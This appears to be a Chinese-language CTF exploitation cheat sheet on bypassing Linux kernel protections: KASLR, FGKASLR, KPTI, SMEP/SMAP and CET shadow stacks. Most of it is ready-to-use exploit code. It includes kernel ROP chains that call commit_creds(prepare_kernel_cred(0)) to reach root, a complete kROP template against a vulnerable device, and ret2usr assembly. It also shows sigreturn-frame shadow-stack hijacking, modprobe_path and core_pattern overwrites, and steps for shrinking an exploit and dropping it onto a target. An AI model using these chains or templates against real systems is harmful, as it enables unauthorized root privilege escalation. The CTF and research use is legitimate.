---

phase: binary
vuln_class: [pwn, kernel, kaslr, kpti, smep, smap, cet]
title: 内核保护绕过
summary: 保护不是一层，是四层各自挡不同的东西——KASLR 挡「不知道地址」，KPTI 挡「回不去用户态」，SMEP/SMAP 挡「借用户态内存」，CET 挡「伪造返回地址」。判据是先确认开了哪几层。
---

# 内核保护绕过

内核基础（环境、堆喷、栈溢出、提权、`modprobe_path`、`core_pattern`）见 [[binary/漏洞利用/kernel.md|内核基础]]；进阶手法（`tty_struct` kROP、uffd、SLUB、跨缓存、PTE 重叠）见 [[binary/漏洞利用/kernel-techniques.md|内核进阶]]。

## 0. 判据速查

| 卡在哪 | 说明 | 去哪节 |
|---|---|---|
| 不知道内核基址 | KASLR 挡的是「地址未知」，不是「地址不可算」 | §1 |
| 有基址但函数地址还是乱 | FGKASLR 逐函数随机化 | §2 |
| `commit_creds` 成功但回不到用户态 | KPTI 的 CR3 没换回来 | §3 |
| `iretq` 回来就 SIGSEGV | 可能是 KPTI，也可能是 CET | §3、§4 |
| 跳到用户态代码被拒 | SMEP | §5 |
| 内核读用户态内存失败 | SMAP | §5 |
| `RET` 触发 `#CP` | 影子栈不匹配（CET-SHSTK） | §4 |
| `/proc/kallsyms` 里没有 `modprobe_path` | 缺 `CONFIG_KALLSYMS_ALL` | §8 |
| 调试时模块地址全是 0 | `/proc/modules` 需要 root | §6 |

---

## 1. KASLR

### 栈泄漏（最通用）

```c
#define KERNEL_BASE 0xffffffff81000000      // 无 KASLR 时的基址

unsigned long leak[40];
read(fd, leak, sizeof(leak));               // 模块的越界读

// leak[38] 里是随机化后的内核代码指针
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

unsigned long commit_creds_kaslr  = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr   = pop_rdi_ret + kaslr_offset;
```

**关键**：掩掉低 16 位（`& 0xffffffffffff0000`）再减基址，否则页内偏移会污染 slide。

### 其他泄漏源

- `/proc/kallsyms`（`kptr_restrict != 1` 时）
- `dmesg`（`dmesg_restrict != 1` 时）
- 内核 oops 消息（oops 不 panic 时）
- UAF 读释放对象里的代码指针
- **`modprobe_path` 只有 1 字节熵**——有 AAW 时可爆破

---

## 2. FGKASLR

FGKASLR（Function Granular KASLR）逐函数随机化，但 `.text` 前段（约到 offset `0x400dc6`）仍相对内核基址固定——这段里的 gadget 可以放心用。

### 方法一：只用未随机化段的 gadget

```bash
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` 就在这段里，只需要 KASLR 基址偏移即可。

### 方法二：从 `__ksymtab` 解出随机化函数

`__ksymtab` 用**相对偏移**而非绝对地址，且它自己不被 FG-KASLR 随机化：

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// 真实地址 = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc;  // 从 /proc/kallsyms
unsigned long ksymtab_commit_creds         = 0xffffffff81f87d90;

payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;   // 读 4 字节相对偏移
payload[off++] = 0x0;
payload[off++] = kpti_trampoline + kaslr_offset + 22;         // 先回用户态算
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;

void resolve_and_continue() {
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // 用 resolved 组第二段 ROP 再进内核
}
```

**关键**：FG-KASLR 下必须**多阶段**——先回用户态把地址算出来，再用解出的地址重新进内核。

---

## 3. KPTI

KPTI 隔离内核页表与用户页表。裸 `swapgs; iretq` 会失败，因为用户页表没被换回来。四条路：

### 方法一：`swapgs_restore` trampoline

`swapgs_restore_regs_and_return_to_usermode` 内含完整的 KPTI 返回序列。跳到 **+22 偏移**跳过寄存器恢复前奏，直接落在换 CR3 + `swapgs` + `iretq` 那段：

```c
unsigned long kpti_trampoline = 0xffffffff81200f10;   // 从 /proc/kallsyms 或 vmlinux

payload[off++] = kpti_trampoline + 22;
payload[off++] = 0x0;                  // trampoline 会弹掉的两个填充
payload[off++] = 0x0;
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**坑**：+22 这个偏移**随内核版本变**，必须反汇编该函数确认（找 `mov rdi, rsp` 之后的 `swapgs`）。

### 方法二：信号处理器

先注册 SIGSEGV 处理器。`iretq` 未做 KPTI 处理就返回，缺页触发 SIGSEGV，处理器接管：

```c
void spawn_shell() { if (getuid() == 0) system("/bin/sh"); }

struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

ROP 链照样 `commit_creds(prepare_kernel_cred(0))` 再 `swapgs; iretq`。**即使返回因页表错误而崩，凭据已经提交了**——SIGSEGV 处理器跑的时候已经是 root。

### 方法三：ROP 里直接改 `modprobe_path`

不回用户态，用 `pop rax; pop rdi; mov [rdi], rax; ret` 在 ROP 链里写 `modprobe_path`。写发生在内核上下文，完全不需要 KPTI 处理。详见 [[binary/漏洞利用/kernel.md|内核基础]]。

### 方法四：ROP 里改 `core_pattern`

同上，把 `core_pattern` 写成管道命令（`"|/evil"`）。任意进程崩了内核就以 root 执行它。

---

## 4. CET：影子栈（SHSTK）与 IBT

- **SHSTK**：硬件影子栈在 `SSP`。每次 `CALL` 同时压入普通栈和影子栈，`RET` 检查两者一致。内核用 `WRSS`/`WRUSS` 和 `MSR_IA32_PL0_SSP` 维护。
- **IBT**：间接 call/jmp 必须落在 `ENDBR64` 上。

### 为什么信号帧能绕过影子栈

`sigreturn`/`sigaltstack` 时，内核会从信号帧的 `xsave` 区（`struct sigcontext` + `xsaves`）**恢复**用户的 `SSP`。而信号帧由用户态控制——攻击者可以把 `SSP` 指到自己造的影子栈上，里面放好 ROP 返回地址。

```c
// 1. 准备一块既当备用信号栈、又当合法影子栈的内存
void *shstk_mem = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0);
unsigned long ssp = (unsigned long)shstk_mem + 0x2000 - 8;

// 2. 标记为影子栈
arch_prctl(ARCH_SHSTK_ENABLE, ...);       // 0x5001；部分内核会自动标记 sigaltstack
arch_prctl(ARCH_CET_ALLOC_SHSTK, &ssp);

// 3. 把 ROP 地址压进影子栈（必须与普通栈镜像一致）
*(unsigned long *)ssp        = (unsigned long)pop_rdi_ret;
*(unsigned long *)(ssp - 8)  = 0;
*(unsigned long *)(ssp - 16) = (unsigned long)prepare_kernel_cred;

// 4. 用可控信号帧把 SSP 恢复成 ssp
struct sigaction sa = { .sa_sigaction = handler, .sa_flags = SA_SIGINFO | SA_ONSTACK };
sigaltstack(&(stack_t){ .ss_sp = shstk_mem, .ss_size = 0x2000, .ss_flags = 0 }, NULL);
sigaction(SIGUSR1, &sa, NULL);

void handler(int sig, siginfo_t *info, void *ucontext) {
    ucontext_t *uc = (ucontext_t *)ucontext;
    // x86-64 CET 下 SSP 在 uc->uc_mcontext.__ssp（或 xsaves offset 0x1f8）
    uc->uc_mcontext.__ssp = ssp - 16;
    uc->uc_mcontext.gregs[REG_RSP] = (unsigned long)rop_chain;
    uc->uc_mcontext.gregs[REG_RIP] = (unsigned long)pop_rdi_ret;
}

raise(SIGUSR1);      // sigreturn 时内核用 WRSS 把 SSP 恢复成我们给的值
```

### 简化版：直接 sigreturn ROP

```python
from pwn import *

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = normal_rop_addr

# pwntools 的 SigreturnFrame 没有 ssp 字段。要控影子栈就手工改 xsave 区里的 SSP 槽
raw = bytearray(bytes(frame))
ssp_offset = 0x1e8        # CET-aware 内核上 SSP 在信号帧 0x1e8-0x200
raw[ssp_offset:ssp_offset + 8] = p64(fake_shstk_addr)

# 普通栈的 ROP 链要镜像到假影子栈，保证每次 RET 两边都能对上
fake_shstk = flat([pop_rdi_ret, 0, prepare_kernel_cred])
```

**关键三条**：
- 影子栈**不是**屏障——只要能触发信号，`sigreturn` 就是一个特权的 `WRSS` gadget，会从用户可控内存恢复 `SSP`
- IBT 一起被绕过：信号处理器返回走 `IRET`，不是间接 `JMP`，不检查 `ENDBR64`
- 没有 `ARCH_CET_ALLOC_SHSTK` 的内核上，可以复用已有的影子栈映射，用先前的写原语改内容，再通过信号帧把 `SSP` 指过去

**检测**：`cat /proc/cpuinfo | grep cet`、`rdmsr 0x6a2`（IA32_PL0_SSP）、`arch_prctl(ARCH_CET_STATUS)`。CET 开着就说明任何 RIP 劫持都必须配影子栈控制。

---

## 5. SMEP / SMAP

| 保护 | 挡什么 | 绕过 |
|---|---|---|
| SMEP | 内核态执行用户页 | kROP（gadget 全从内核 `.text` 取） |
| SMAP | 内核态访问用户内存 | kROP + 链放内核堆；或用 `stac`/`clac` gadget 临时开 |
| 都无 | 无 | ret2usr——直接在内核态调用户态提权函数 |
| KPTI | 内核页表隔离 | §3 的四种方法 |

**老内核的 CR4 直改**：写 CR4 清 SMEP/SMAP 位。现代内核被 `native_write_cr4()` 钉住，不可行。

---

## 6. GDB 调内核模块

```bash
# 1. QEMU 里以 root 找模块加载地址
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. GDB 里按该地址加载符号
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite
(gdb) c

# 3. 断下后看栈
(gdb) x/20xg $rsp-0x90
(gdb) search "AAAAAAAA"        # pwndbg 找缓冲区位置
```

**坑**：`/proc/modules` 只有 root 能看真实地址，非 root 全是 0。调试时改 `/init` 保留 root。

---

## 7. initramfs 与 virtio-9p

### virtio-9p 共享目录（免重建 initramfs）

```bash
# QEMU 启动参数
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# 客户机内（加进 /init 或手动跑）
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# 宿主机上直接编译进去
gcc exploit.c -static -o ./share/exploit
```

### 解包与改 initramfs

```bash
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

# 改 /init：注释掉 exec su -l ctf，换成 /bin/sh 保留 root

find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

**`/init` 里要注释掉的四行**：
- `exec su -l ctf`（保留 root）
- `echo 1 > /proc/sys/kernel/kptr_restrict`（才能看 `/proc/kallsyms`）
- `echo 1 > /proc/sys/kernel/dmesg_restrict`（才能看 dmesg）
- `chmod 400 /proc/kallsyms`（才能读符号地址）

---

## 8. 没有 `CONFIG_KALLSYMS_ALL` 时找数据符号

`/proc/kallsyms` 默认只列 `.text` 符号。`modprobe_path`、`core_pattern` 这类数据符号需要 `CONFIG_KALLSYMS_ALL=y`。

### 找 `modprobe_path`

```bash
# 1. call_usermodehelper_setup 一定在 /proc/kallsyms 里
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. GDB 下断并触发
hb *0xffffffff810c8c80
# 触发：echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. 看第一个参数（RDI 就是 modprobe_path）
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

### 找 `core_pattern`

1. 在 `override_creds`（`do_coredump` 调用它）下断
2. 崩一个进程：`gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'`
3. `override_creds` 返回后反汇编，找 `movzx` 里的数据地址

---

## 9. 模板

### 完整 kROP（SMEP + KPTI）

```c
unsigned long prepare_kernel_cred, commit_creds, pop_rdi_ret;
unsigned long mov_rdi_rax_pop1_ret, kpti_trampoline;
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;
}

int main() {
    save_userland_state();
    int fd = open("/dev/hackme", O_RDWR);

    // 1. 泄 canary + KASLR
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;

    prepare_kernel_cred += kaslr_offset;
    commit_creds += kaslr_offset;
    pop_rdi_ret += kaslr_offset;
    mov_rdi_rax_pop1_ret += kaslr_offset;
    kpti_trampoline += kaslr_offset;

    // 2. 组链
    unsigned long payload[50];
    int off = 16;
    payload[off++] = cookie;
    payload[off++] = 0;    // rbx
    payload[off++] = 0;    // r12
    payload[off++] = 0;    // rbp

    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = mov_rdi_rax_pop1_ret;
    payload[off++] = 0;    // pop rbx 填充
    payload[off++] = commit_creds;

    payload[off++] = kpti_trampoline + 22;
    payload[off++] = 0;
    payload[off++] = 0;
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));
}
```

### ret2usr（无 SMEP/SMAP）

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];     push r15;"
        "mov r15, %[user_sp];     push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];     push r15;"
        "mov r15, %[user_rip];    push r15;"
        "iretq;"
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

---

## 10. 投递

内核利用通常是几十 KB 的静态二进制，远程投递要压体积：

```bash
musl-gcc -static -O2 -o exploit exploit.c     # musl 比 glibc 小得多
strip exploit
gzip exploit && base64 exploit.gz > exploit.b64

# 目标机上
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

upx --best exploit                             # 可选，进一步压
```

**坑**：如果利用里用 `setxattr()` 带文件路径，确认该文件在远端存在——本地 `/tmp/exploit` 和远端 `/home/user/exploit` 不是一回事。

---

## 11. 纪律

- **先确认开了哪几层保护**：`cat /proc/cpuinfo | grep -E "smep|smap|cet"`、`grep -E "KASLR|KPTI|SHADOW_STACK" /boot/config-*`。少确认一层就会在最后一跳崩掉。
- **KPTI 的 +22 偏移必须反汇编确认**，抄别人的数字换版本就废。
- **能改数据就不回用户态**：`modprobe_path`/`core_pattern` 比构造完整 KPTI 返回链省事得多。
- **FGKASLR 一定要多阶段**：单阶段拿不到随机化函数地址。
- **CET 开着就先想信号帧**：直接 kROP 会在 `RET` 上触发 `#CP`。
- **调试环境先改 `/init`**：不保留 root，`/proc/modules` 和 `/proc/kallsyms` 都是废的。
